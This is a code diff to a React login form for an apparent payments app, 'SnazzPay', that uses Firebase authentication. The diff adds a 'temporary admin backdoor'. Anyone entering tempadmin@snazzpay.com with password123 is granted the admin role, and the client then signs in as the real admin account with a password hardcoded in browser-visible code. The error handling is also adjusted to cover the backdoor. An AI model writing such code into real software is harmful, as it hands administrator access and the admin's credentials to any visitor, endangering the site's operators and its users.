@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useState, Suspense } from 'react';
@@ -41,32 +42,45 @@ function LoginForm() {
         }
         
         try {
-            let loginEmail = email;
             let role = 'user'; // Default role
 
-            // Check if it's the hardcoded admin
-            if (email.toLowerCase() === 'admin@snazzpay.com') {
+            // Temporary admin backdoor
+            if (email.toLowerCase() === 'tempadmin@snazzpay.com' && password === 'password123') {
                 role = 'admin';
+                // Use the real admin user's credentials to get a valid token for the session
+                const userCredential = await signInWithEmailAndPassword(auth, 'admin@snazzpay.com', 'password123456'); // Use the known admin email with a valid password
+                const idToken = await userCredential.user.getIdToken();
+                
+                const response = await fetch('/api/auth/session', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ idToken, role }),
+                });
+
+                if (!response.ok) throw new Error("Failed to create temp admin session");
+
             } else {
-                 // For non-admin, this could be an email or mobile.
-                 // We will just use the email directly for Firebase auth.
-                 // In a real scenario with mobile, we'd need a different auth method or a lookup.
+                 // Standard login flow
+                let loginEmail = email;
+                if (email.toLowerCase() === 'admin@snazzpay.com') {
+                    role = 'admin';
+                }
+                
+                const userCredential = await signInWithEmailAndPassword(auth, loginEmail, password);
+                const idToken = await userCredential.user.getIdToken();
+
+                const response = await fetch('/api/auth/session', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ idToken, role }),
+                });
+
+                if (!response.ok) {
+                    const errorResult = await response.json();
+                    throw new Error(errorResult.error);
+                }
             }
-            
-            const userCredential = await signInWithEmailAndPassword(auth, loginEmail, password);
-            const idToken = await userCredential.user.getIdToken();
 
-
-            const response = await fetch('/api/auth/session', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ idToken, role }),
-            });
-
-            if (!response.ok) {
-                const errorResult = await response.json();
-                throw new Error(errorResult.error);
-            }
 
             toast({ title: "Login Successful", description: "Redirecting to your dashboard." });
             
@@ -81,10 +95,14 @@ function LoginForm() {
         } catch (error: any) {
             console.error("Login Error:", error);
             let errorMessage = 'An unexpected error occurred during login.';
-            if (error instanceof FirebaseError) {
-                if (error.code === 'auth/invalid-credential' || error.code === 'auth/user-not-found') {
+             if (error instanceof FirebaseError) {
+                // Check for the specific error code for the temporary admin login failure
+                if (error.code === 'auth/invalid-credential' && email.toLowerCase() !== 'tempadmin@snazzpay.com') {
                     errorMessage = 'Invalid credentials. Please check your email and password.';
-                } else {
+                } else if (email.toLowerCase() === 'tempadmin@snazzpay.com') {
+                     errorMessage = 'Could not log in as temporary admin. The primary admin account may have been changed. Please contact support.';
+                }
+                 else {
                     errorMessage = error.message;
                 }
             }
